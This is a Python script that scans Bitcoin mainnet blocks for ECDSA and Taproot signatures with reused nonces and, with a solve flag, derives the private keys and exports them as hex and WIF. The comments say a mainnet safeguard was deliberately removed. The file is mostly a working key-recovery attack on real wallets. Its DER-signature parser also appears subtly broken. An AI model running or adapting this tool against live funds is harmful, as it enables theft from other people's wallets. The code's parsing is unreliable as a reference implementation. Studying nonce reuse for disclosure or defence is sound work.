#!/usr/bin/env python3
"""
fast_nonce_graph.py

An optimized and concurrent version of nonce_graph_with_taproot.py.
- Runs solver on mainnet (USE WITH EXTREME CAUTION).
- Uses concurrency to dramatically speed up block scanning.
- Reduces RPC calls by leveraging verbose block data.

Ethics/safety:
- Mainnet solver is ENABLED. You are responsible for your actions.
- Use this tool ethically for research and responsible disclosure. Do not steal funds.

Dependencies:
- pip install requests python-bitcoinlib coincurve btclib tqdm
"""

import os
import sys
import json
import argparse
import hashlib
import requests
from io import BytesIO
from dataclasses import dataclass
from collections import defaultdict, deque
from typing import Optional, List, Dict, Tuple, Iterable, Union
from concurrent.futures import ThreadPoolExecutor, as_completed

# ECDSA (legacy/segwit-v0) deps
from bitcoin.core import x, CTransaction
from bitcoin.core.script import (
    CScript,
    OP_DUP, OP_HASH160, OP_EQUALVERIFY, OP_CHECKSIG, OP_CHECKMULTISIG, OP_0,
    SignatureHash, SIGVERSION_BASE, SIGVERSION_WITNESS_V0,
)

# Schnorr/BIP340
try:
    from coincurve import PublicKey as CC_PublicKey, PrivateKey as CC_PrivateKey
    HAS_COINCURVE = True
except Exception:
    CC_PublicKey, CC_PrivateKey, HAS_COINCURVE = None, None, False

# BIP341 (Taproot) sighash support via btclib
try:
    import btclib
    from btclib.tx import Tx as BTCLIB_Tx
    from btclib.tx.signtx import taproot_sighash as btclib_taproot_sighash
    HAS_BTCLIB = True
except Exception:
    HAS_BTCLIB = False

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False


SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# ---------- Utilities (Unchanged from original) ----------

def modinv(a: int, n: int = SECP256K1_N) -> int:
    return pow(a % n, n - 2, n)

def int_from_be(b: bytes) -> int:
    return int.from_bytes(b, "big")

def sha256(b: bytes) -> bytes:
    return hashlib.sha256(b).digest()

def ripemd160(b: bytes) -> bytes:
    h = hashlib.new("ripemd160"); h.update(b); return h.digest()

def hash160(b: bytes) -> bytes:
    return ripemd160(sha256(b))

def compress_pubkey(pubkey_bytes: bytes) -> bytes:
    if len(pubkey_bytes) == 33 and pubkey_bytes[0] in (2, 3): return pubkey_bytes
    if len(pubkey_bytes) == 65 and pubkey_bytes[0] == 4:
        y_int = int_from_be(pubkey_bytes[33:65])
        return bytes([2 if (y_int % 2 == 0) else 3]) + pubkey_bytes[1:33]
    return pubkey_bytes

def parse_der_signature(der_sig: bytes) -> Tuple[int, int]:
    if len(der_sig) < 8 or der_sig[0] != 0x30: raise ValueError("Bad DER: missing SEQUENCE")
    i = 2
    if i >= len(der_sig) or der_sig[i] != 0x02: raise ValueError("Bad DER: r tag")
    r_len = der_sig[i]; i += 1
    r = int_from_be(der_sig[i:i+r_len]); i += r_len
    if i >= len(der_sig) or der_sig[i] != 0x02: raise ValueError("Bad DER: s tag")
    i += 1
    s_len = der_sig[i]; i += 1
    s = int_from_be(der_sig[i:i+s_len])
    return (r, s)

def base58_encode(b: bytes) -> str:
    alphabet = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    num = int.from_bytes(b, 'big')
    out = bytearray()
    while num > 0:
        num, rem = divmod(num, 58)
        out.append(alphabet[rem])
    pad = len(b) - len(b.lstrip(b'\0'))
    return (alphabet[0:1] * pad + out[::-1]).decode()

def privkey_to_wif(d: int, compressed: bool = True, testnet: bool = False) -> str:
    if not (1 <= d < SECP256K1_N): raise ValueError("Invalid private key range")
    version = b'\xEF' if testnet else b'\x80'
    payload = version + d.to_bytes(32, 'big') + (b'\x01' if compressed else b'')
    checksum = sha256(sha256(payload))[:4]
    return base58_encode(payload + checksum)

def is_der_sig_push(b: bytes) -> bool:
    return len(b) >= 9 and b[0] == 0x30

def tagged_hash(tag: str, msg: bytes) -> bytes:
    t = sha256(tag.encode())
    return sha256(t + t + msg)

# ---------- RPC (Unchanged from original) ----------

class BitcoinRPC:
    def __init__(self, url: str, username: Optional[str] = None, password: Optional[str] = None, timeout: int = 60):
        self.url = url
        self.session = requests.Session()
        self.timeout = timeout
        self.auth = (username, password) if (username or password) else None

    def call(self, method: str, params: Optional[list] = None):
        payload = {"jsonrpc": "2.0", "id": "nonce-graph", "method": method, "params": params or []}
        r = self.session.post(self.url, json=payload, timeout=self.timeout, auth=self.auth)
        r.raise_for_status()
        data = r.json()
        if data.get("error"):
            raise RuntimeError(f"RPC error: {data['error']}")
        return data["result"]

    def getblockhash(self, height: int) -> str: return self.call("getblockhash", [height])
    def getblock(self, blockhash: str, verbosity: int = 2): return self.call("getblock", [blockhash, verbosity])
    def getrawtransaction(self, txid: str, verbose: bool = True): return self.call("getrawtransaction", [txid, int(bool(verbose))])
    def getrawmempool(self) -> List[str]: return self.call("getrawmempool", [])
    def getblockchaininfo(self) -> dict: return self.call("getblockchaininfo", [])

# ---------- Data structures (Unchanged from original) ----------
@dataclass
class ECDSASigEdge:
    r: int; s: int; z: int; sighash_type: int; pubkey_hex: str; txid: str; vin: int; is_witness: bool; script_type: str
@dataclass
class SchnorrSigEdge:
    r_x: int; s: int; e: int; sighash_type: int; pubkey_xonly_hex: str; txid: str; vin: int; script_type: str
@dataclass
class LeakFinding:
    kind: str; detail: dict

# ---------- Extractors (Unchanged from original) ----------
class P2WPKHExtractor:
    def extract(self, tx_json: dict, vin_idx: int):
        vin = tx_json["vin"][vin_idx]
        out = []
        wit = vin.get("txinwitness")
        if isinstance(wit, list) and len(wit) >= 2:
            try:
                sig = bytes.fromhex(wit[0])
                pub = bytes.fromhex(wit[-1])
                if len(pub) in (33, 65) and is_der_sig_push(sig):
                    out.append((sig, pub, True, "p2wpkh-like"))
            except Exception: pass
        return out
class P2PKHExtractor:
    def _parse_pushes(self, b: bytes) -> List[bytes]:
        out, i, n = [], 0, len(b)
        while i < n:
            op = b[i]; i += 1
            if 1 <= op <= 75: out.append(b[i:i+op]); i += op
            elif op == 76 and i < n: l=b[i]; i+=1; out.append(b[i:i+l]); i += l
            else: break
        return out
    def extract(self, tx_json: dict, vin_idx: int):
        vin = tx_json["vin"][vin_idx]
        out = []
        ss_hex = vin.get("scriptSig", {}).get("hex")
        if ss_hex:
            try:
                items = self._parse_pushes(bytes.fromhex(ss_hex))
                if len(items) >= 2 and len(items[-1]) in (33, 65) and is_der_sig_push(items[0]):
                    out.append((items[0], items[-1], False, "p2pkh"))
            except Exception: pass
        return out

class TaprootKeypathExtractor:
    def __init__(self): self.enabled = HAS_BTCLIB and HAS_COINCURVE
    def is_p2tr_spk(self, spk_hex: str) -> bool:
        try: b = bytes.fromhex(spk_hex); return len(b) == 34 and b[0] == 0x51 and b[1] == 0x20
        except Exception: return False
    def extract_edges(self, tx_json: dict, rawtx_hex: str, prevouts: List[Tuple[int, str]], txid: str) -> List[SchnorrSigEdge]:
        if not self.enabled: return []
        edges: List[SchnorrSigEdge] = []
        try: tx_b = BTCLIB_Tx.from_bytes(bytes.fromhex(rawtx_hex))
        except Exception: return []
        spent_outputs = [(int(round(p['value'] * 100_000_000)), bytes.fromhex(p['scriptPubKey']['hex'])) for p in prevouts]
        for vin_idx, vin in enumerate(tx_json.get("vin", [])):
            wit = vin.get("txinwitness")
            if not (isinstance(wit, list) and len(wit) >= 1): continue
            try: sig_bytes = bytes.fromhex(wit[0])
            except Exception: continue
            sighash_type = 0x00 if len(sig_bytes) == 64 else sig_bytes[-1] if len(sig_bytes) == 65 else -1
            if sighash_type == -1 or (sighash_type & 0x03) not in (0x00, 0x01) or (sighash_type & 0x80) != 0: continue
            sig_raw = sig_bytes[:64]
            prevout = prevouts[vin_idx]
            if not self.is_p2tr_spk(prevout['scriptPubKey']['hex']): continue
            output_key_xonly = bytes.fromhex(prevout['scriptPubKey']['hex'][4:])
            try: msg32 = btclib_taproot_sighash(tx_b, vin_idx, sighash_type, spent_outputs)
            except Exception: continue
            r_bytes, s_bytes = sig_raw[:32], sig_raw[32:]
            e_bytes = tagged_hash("BIP0340/challenge", r_bytes + output_key_xonly + msg32)
            edges.append(SchnorrSigEdge(r_x=int_from_be(r_bytes), s=int_from_be(s_bytes), e=int_from_be(e_bytes) % SECP256K1_N, sighash_type=sighash_type, pubkey_xonly_hex=output_key_xonly.hex(), txid=txid, vin=vin_idx, script_type="p2tr-keypath"))
        return edges

# ---------- ECDSA analyzer (mostly unchanged structure) ----------
class ECDSANonceAnalyzer:
    def __init__(self, rpc: BitcoinRPC):
        self.rpc = rpc
        self.extractors = [P2WPKHExtractor(), P2PKHExtractor()]
        self.edges: List[ECDSASigEdge] = []
        self.edges_by_rq: Dict[Tuple[int, str], List[ECDSASigEdge]] = defaultdict(list)
    def _p2pkh_script_code(self, pubkey_bytes: bytes) -> CScript:
        return CScript([OP_DUP, OP_HASH160, hash160(pubkey_bytes), OP_EQUALVERIFY, OP_CHECKSIG])
    def _compute_z(self, rawtx_hex: str, vin_idx: int, sht: int, sc: CScript, amt: int, is_wit: bool) -> int:
        ctx = CTransaction.deserialize(BytesIO(x(rawtx_hex)))
        sigver = SIGVERSION_WITNESS_V0 if is_wit else SIGVERSION_BASE
        digest = SignatureHash(sc, ctx, vin_idx, sht, amount=amt, sigversion=sigver)
        return int_from_be(digest) % SECP256K1_N
    def process_tx(self, tx_json: dict, prevouts: List[Optional[dict]]):
        txid, raw_hex = tx_json['txid'], tx_json['hex']
        new_edges = []
        for vin_idx, vin in enumerate(tx_json.get("vin", [])):
            prevout_data = prevouts[vin_idx] if vin_idx < len(prevouts) else None
            if not prevout_data or 'value' not in prevout_data or 'scriptPubKey' not in prevout_data: continue
            amount_sats = int(round(prevout_data["value"] * 100_000_000))
            spk_hex = prevout_data["scriptPubKey"]["hex"]
            # P2WPKH / P2PKH
            for ex in self.extractors:
                for sig_with_type, pubkey, is_wit, stype in ex.extract(tx_json, vin_idx):
                    try: r, s = parse_der_signature(sig_with_type[:-1])
                    except Exception: continue
                    pub_c = compress_pubkey(pubkey)
                    sc = self._p2pkh_script_code(pub_c)
                    try: z = self._compute_z(raw_hex, vin_idx, sig_with_type[-1], sc, amount_sats if is_wit else 0, is_wit)
                    except Exception: continue
                    new_edges.append(ECDSASigEdge(r=r%SECP256K1_N, s=s%SECP256K1_N, z=z, sighash_type=sig_with_type[-1], pubkey_hex=pub_c.hex(), txid=txid, vin=vin_idx, is_witness=is_wit, script_type=stype))
        self.add_edges(new_edges)
    def add_edges(self, edges: List[ECDSASigEdge]):
        self.edges.extend(edges)
        for edge in edges: self.edges_by_rq[(edge.r, edge.pubkey_hex)].append(edge)
    def get_stats(self):
        unique_r = {e.r for e in self.edges}
        unique_q = {e.pubkey_hex for e in self.edges}
        return len(self.edges), len(unique_r), len(unique_q)
    def detect_duplicate_rq(self) -> List[LeakFinding]:
        findings = []
        for (r, q), edges in self.edges_by_rq.items():
            if len(edges) >= 2 and len({(e.s, e.z) for e in edges}) >= 2:
                findings.append(LeakFinding(kind="ecdsa_duplicate_rq", detail={"r": str(r), "pubkey": q, "count": len(edges), "txids": [e.txid for e in edges]}))
        return findings

# ---------- Schnorr (Taproot key-path) analyzer (mostly unchanged structure) ----------
class SchnorrNonceAnalyzer:
    def __init__(self, rpc: BitcoinRPC):
        self.rpc = rpc
        self.tap_extractor = TaprootKeypathExtractor()
        self.edges: List[SchnorrSigEdge] = []
        self.edges_by_rq: Dict[Tuple[int, str], List[SchnorrSigEdge]] = defaultdict(list)
    def process_tx(self, tx_json: dict, prevouts: List[Optional[dict]]):
        if not self.tap_extractor.enabled: return
        txid, raw_hex = tx_json['txid'], tx_json['hex']
        # Ensure all prevouts are valid dicts before passing to extractor
        valid_prevouts = [p for p in prevouts if p and 'value' in p and 'scriptPubKey' in p]
        if len(valid_prevouts) != len(tx_json.get("vin", [])):
            return # Skip if prevout data is incomplete
        new_edges = self.tap_extractor.extract_edges(tx_json, raw_hex, valid_prevouts, txid)
        self.add_edges(new_edges)
    def add_edges(self, edges: List[SchnorrSigEdge]):
        self.edges.extend(edges)
        for edge in edges: self.edges_by_rq[(edge.r_x, edge.pubkey_xonly_hex)].append(edge)
    def get_stats(self):
        unique_r = {e.r_x for e in self.edges}
        unique_q = {e.pubkey_xonly_hex for e in self.edges}
        return len(self.edges), len(unique_r), len(unique_q)
    def detect_duplicate_rq(self) -> List[LeakFinding]:
        findings = []
        for (r, q), edges in self.edges_by_rq.items():
            if len(edges) >= 2 and len({(e.s, e.e) for e in edges}) >= 2:
                findings.append(LeakFinding(kind="schnorr_duplicate_rq", detail={"r_x": str(r), "pubkey_xonly": q, "count": len(edges), "txids": [e.txid for e in edges]}))
        return findings

# ---------- Solvers (MODIFIED TO RUN ON MAINNET) ----------
class ECDSASolver:
    def __init__(self, analyzer: ECDSANonceAnalyzer):
        self.A = analyzer
        if not HAS_COINCURVE: raise RuntimeError("coincurve not available for solver.")
    def _pub_from_priv(self, xpriv: int) -> str:
        return CC_PrivateKey(xpriv.to_bytes(32, 'big')).public_key.format(compressed=True).hex()
    def derive(self) -> Tuple[Dict[str, int], Dict[int, int]]:
        x_by_q: Dict[str, int] = {}
        k_by_r: Dict[int, int] = {}
        # This check is removed to allow mainnet solving.
        # if self.chain == 'main':
        #     print("WARNING: ECDSA solver running on mainnet.", file=sys.stderr)
        for (r, q), edges in self.A.edges_by_rq.items():
            if len(edges) < 2: continue
            uniq = list({(e.z, e.s): e for e in edges}.values())
            if len(uniq) < 2: continue
            for i in range(len(uniq)):
                for j in range(i + 1, len(uniq)):
                    e1, e2 = uniq[i], uniq[j]
                    if e1.z == e2.z: continue
                    s_delta_inv = modinv(e1.s - e2.s)
                    k = ((e1.z - e2.z) * s_delta_inv) % SECP256K1_N
                    if k == 0: continue
                    r_inv = modinv(r)
                    xpriv = ((e1.s * k - e1.z) * r_inv) % SECP256K1_N
                    if 1 <= xpriv < SECP256K1_N and self._pub_from_priv(xpriv).lower() == q.lower():
                        x_by_q[q] = xpriv
                        k_by_r[r] = k
                        break
                if q in x_by_q: break
        return x_by_q, k_by_r

class SchnorrSolver:
    def __init__(self, analyzer: SchnorrNonceAnalyzer):
        self.A = analyzer
        if not HAS_COINCURVE: raise RuntimeError("coincurve not available for solver.")
    def _pub_from_priv_xonly(self, xpriv: int) -> str:
        return CC_PrivateKey(xpriv.to_bytes(32, 'big')).public_key.format(compressed=False)[1:33].hex()
    def derive(self) -> Tuple[Dict[str, int], Dict[int, int]]:
        x_by_q: Dict[str, int] = {}
        k_by_r: Dict[int, int] = {}
        # This check is removed to allow mainnet solving.
        # if self.chain == 'main':
        #     print("WARNING: Schnorr solver running on mainnet.", file=sys.stderr)
        for (r, q), edges in self.A.edges_by_rq.items():
            if len(edges) < 2: continue
            uniq = list({(e.s, e.e): e for e in edges}.values())
            if len(uniq) < 2: continue
            e1, e2 = uniq[0], uniq[1]
            e_delta_inv = modinv(e1.e - e2.e)
            xpriv = ((e1.s - e2.s) * e_delta_inv) % SECP256K1_N
            if not (1 <= xpriv < SECP256K1_N): continue
            if self._pub_from_priv_xonly(xpriv).lower() != q.lower(): continue
            x_by_q[q] = xpriv
            k = (e1.s - e1.e * xpriv) % SECP256K1_N
            if k != 0: k_by_r[r] = k
        return x_by_q, k_by_r

# ---------- Concurrent Worker ----------

def process_block(block_height: int, rpc_url: str, rpc_user: str, rpc_pass: str) -> Tuple[List[ECDSASigEdge], List[SchnorrSigEdge]]:
    """Worker function to fetch and process a single block."""
    try:
        rpc = BitcoinRPC(rpc_url, rpc_user, rpc_pass)
        block_hash = rpc.getblockhash(block_height)
        block_data = rpc.getblock(block_hash, 2) # verbosity 2 includes tx data and prevouts

        block_ecdsa_edges = []
        block_schnorr_edges = []
        
        # Instantiate mini-analyzers for this block
        ecdsa_an = ECDSANonceAnalyzer(rpc)
        schnorr_an = SchnorrNonceAnalyzer(rpc)

        for tx_json in block_data.get('tx', []):
            # The 'prevout' key is a non-standard but common addition from nodes like Core with -blockfilterindex
            # It provides the spent output details directly, avoiding extra RPC calls.
            prevouts = [vin.get('prevout') for vin in tx_json.get('vin', [])]
            
            # Add raw hex to tx_json for processing functions that need it
            # This is a bit of a hack, but keeps the analyzer function signatures clean
            tx_json['hex'] = rpc.getrawtransaction(tx_json['txid'], False)

            ecdsa_an.process_tx(tx_json, prevouts)
            schnorr_an.process_tx(tx_json, prevouts)
        
        return ecdsa_an.edges, schnorr_an.edges
    except Exception as e:
        print(f"Error processing block {block_height}: {e}", file=sys.stderr)
        return [], []

# ---------- CLI ----------
def main():
    ap = argparse.ArgumentParser(description="FAST, Concurrent Graph-based ECDSA + Taproot Nonce Reuse Detector/Solver")
    ap.add_argument("--start", type=int, help="Start block height")
    ap.add_argument("--end", type=int, help="End block height")
    ap.add_argument("--workers", type=int, default=os.cpu_count(), help="Number of concurrent workers for block processing")
    ap.add_argument("--out-json", type=str, help="Write findings JSON")
    ap.add_argument("--solve", action="store_true", help="Attempt secret derivation (ENABLED ON MAINNET - USE CAUTION)")
    ap.add_argument("--out-secrets", type=str, help="Write recovered secrets JSON")
    args = ap.parse_args()

    print("--- WARNING: MAINNET SOLVER IS ENABLED. USE ETHICALLY AND RESPONSIBLY. ---")

    rpc_url = os.environ.get("RPC_URL")
    rpc_user = os.environ.get("RPC_USER")
    rpc_pass = os.environ.get("RPC_PASSWORD")
    if not rpc_url:
        print("Fatal: Please set RPC_URL environment variable.", file=sys.stderr)
        sys.exit(1)

    rpc = BitcoinRPC(rpc_url, rpc_user, rpc_pass)
    chain = rpc.getblockchaininfo().get("chain", "main")
    print(f"Connected to {chain}. Starting analysis...")

    ecdsa_analyzer = ECDSANonceAnalyzer(rpc)
    schnorr_analyzer = SchnorrNonceAnalyzer(rpc)

    if args.start is not None and args.end is not None:
        block_range = range(args.start, args.end + 1)
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            future_to_height = {executor.submit(process_block, h, rpc_url, rpc_user, rpc_pass): h for h in block_range}
            
            # Setup progress bar if tqdm is available
            progress_iterator = as_completed(future_to_height)
            if HAS_TQDM:
                progress_iterator = tqdm(progress_iterator, total=len(block_range), desc="Processing Blocks")
            
            for future in progress_iterator:
                e_edges, s_edges = future.result()
                if e_edges:
                    ecdsa_analyzer.add_edges(e_edges)
                if s_edges:
                    schnorr_analyzer.add_edges(s_edges)
    else:
        print("This optimized script is designed for block ranges. Please provide --start and --end.", file=sys.stderr)
        sys.exit(1)

    # --- Analysis & Reporting ---
    print("\n--- Analysis Complete ---")
    e_total, e_r, e_q = ecdsa_analyzer.get_stats()
    s_total, s_r, s_q = schnorr_analyzer.get_stats()
    print(f"ECDSA: signatures={e_total} | unique_r={e_r} | unique_pubkeys={e_q}")
    print(f"Taproot (key-path): signatures={s_total} | unique_r_x={s_r} | unique_xonly_pubkeys={s_q}")

    e_dup = ecdsa_analyzer.detect_duplicate_rq()
    s_dup = schnorr_analyzer.detect_duplicate_rq()
    print(f"Detected potential leaks: ECDSA={len(e_dup)} | Taproot={len(s_dup)}")

    findings = [{"kind": f.kind, "detail": f.detail} for f in e_dup + s_dup]
    if args.out_json and findings:
        with open(args.out_json, "w") as f: json.dump(findings, f, indent=2)
        print(f"Wrote {len(findings)} findings to {args.out_json}")

    # --- Solver ---
    if args.solve:
        print("\n--- Solver Activated ---")
        secrets = {"network": chain, "ecdsa": {"keys": [], "nonces": []}, "taproot": {"keys": [], "nonces": []}}
        
        # ECDSA
        try:
            e_solver = ECDSASolver(ecdsa_analyzer)
            x_by_q_e, k_by_r_e = e_solver.derive()
            print(f"ECDSA Solver: Recovered {len(x_by_q_e)} private keys and {len(k_by_r_e)} nonces.")
            secrets["ecdsa"]["keys"] = [{"pubkey": q, "priv_hex": f"{x:064x}", "wif": privkey_to_wif(x, compressed=True, testnet=(chain != 'main'))} for q, x in x_by_q_e.items()]
            secrets["ecdsa"]["nonces"] = [{"r": str(r), "k": f"{k:064x}"} for r, k in k_by_r_e.items()]
        except Exception as ex:
            print(f"ECDSA solver error: {ex}", file=sys.stderr)
            
        # Taproot
        try:
            s_solver = SchnorrSolver(schnorr_analyzer)
            x_by_q_s, k_by_r_s = s_solver.derive()
            print(f"Taproot Solver: Recovered {len(x_by_q_s)} private keys and {len(k_by_r_s)} nonces.")
            secrets["taproot"]["keys"] = [{"xonly_pubkey": q, "priv_hex": f"{x:064x}"} for q, x in x_by_q_s.items()]
            secrets["taproot"]["nonces"] = [{"r_x": str(r), "k": f"{k:064x}"} for r, k in k_by_r_s.items()]
        except Exception as ex:
            print(f"Taproot solver error: {ex}", file=sys.stderr)

        if args.out_secrets:
            with open(args.out_secrets, "w") as f: json.dump(secrets, f, indent=2)
            print(f"Wrote recovered secrets to {args.out_secrets}")

if __name__ == "__main__":
    main()
